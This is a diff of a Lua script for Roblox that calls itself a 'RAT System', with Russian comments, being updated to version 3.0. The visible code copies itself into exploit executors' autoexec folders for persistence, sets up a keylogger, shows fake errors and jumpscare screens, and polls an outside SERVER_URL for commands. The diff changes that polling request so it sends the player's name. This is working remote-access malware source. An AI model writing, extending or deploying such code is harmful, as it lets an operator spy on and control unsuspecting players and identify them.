@@ -88,7 +88,7 @@ local function autoInstallToAutoexec()
     end
     
     local success = pcall(function()
-        local scriptSource = "-- RAT System v2.7\n" .. tostring(script.Source)
+        local scriptSource = "-- RAT System v3.0\n" .. tostring(script.Source)
         
         -- Пути для автозагрузки разных эксплойтов
         local autoexecPaths = {
@@ -444,7 +444,7 @@ local function showFakeError(message)
     return success
 end
 
--- Всплывающее сообщение (ИСПРАВЛЕННАЯ ВЕРСИЯ)
+-- Всплывающее сообщение
 local function showPopupMessage(message)
     local success = pcall(function()
         local gui = Instance.new("ScreenGui")
@@ -478,7 +478,6 @@ local function showPopupMessage(message)
         tweenIn:Play()
         tweenTextIn:Play()
         
-        -- Упрощенный таймер без tween.Completed
         task.delay(7, function()
             local tweenOut = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
             local tweenTextOut = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 1})
@@ -486,7 +485,6 @@ local function showPopupMessage(message)
             tweenOut:Play()
             tweenTextOut:Play()
             
-            -- Просто ждем и уничтожаем
             task.delay(0.6, function()
                 pcall(function()
                     if gui and gui.Parent then
@@ -543,7 +541,7 @@ local function setupKeylogger()
     return success
 end
 
--- ЧАТ-МОДУЛЬ (ПОЛНАЯ РАБОЧАЯ ВЕРСИЯ)
+-- ЧАТ-МОДУЛЬ
 local function setupChat()
     local success, result = pcall(function()
         local screenGui = Instance.new("ScreenGui")
@@ -639,7 +637,6 @@ local function setupChat()
 
         sendButton.MouseButton1Click:Connect(sendMessage)
 
-        -- Добавляем системное сообщение при создании
         addMessage("Система", "Чат RAT активирован", true)
 
         return {
@@ -655,7 +652,7 @@ end
 
 local chatSystem = setupChat()
 
--- СКРИМЕР МОДУЛЬ -----------------------------------------------------------------
+-- СКРИМЕР МОДУЛЬ
 local function createFullscreenGUI()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "JumpscareUI"
@@ -892,7 +889,6 @@ local function executeJumpscareCommand(scareType)
         jeffKillerJumpscare()
     end
 end
--- КОНЕЦ СКРИМЕР МОДУЛЯ -----------------------------------------------------------
 
 -- Обработка команд
 local function ExecuteCommand(cmd, args)
@@ -1085,7 +1081,7 @@ local function ExecuteCommand(cmd, args)
                 })
             end)
         
-        -- НОВАЯ КОМАНДА: СКРИМЕР
+        -- СКРИМЕР КОМАНДА
         elseif cmd == "jumpscare" then
             local scareType = tonumber(args[1]) or 1
             task.spawn(function()
@@ -1096,11 +1092,11 @@ local function ExecuteCommand(cmd, args)
     end)
 end
 
--- Функция проверки команд
+-- Функция проверки команд (ОБНОВЛЕНА - отправляем имя игрока)
 local function checkCommands()
     local success, response = pcall(function()
         return httpRequest({
-            Url = SERVER_URL.."/data",
+            Url = SERVER_URL.."/data?player=" .. player.Name,  -- ДОБАВЛЕНО: отправляем имя игрока
             Method = "GET"
         })
     end)
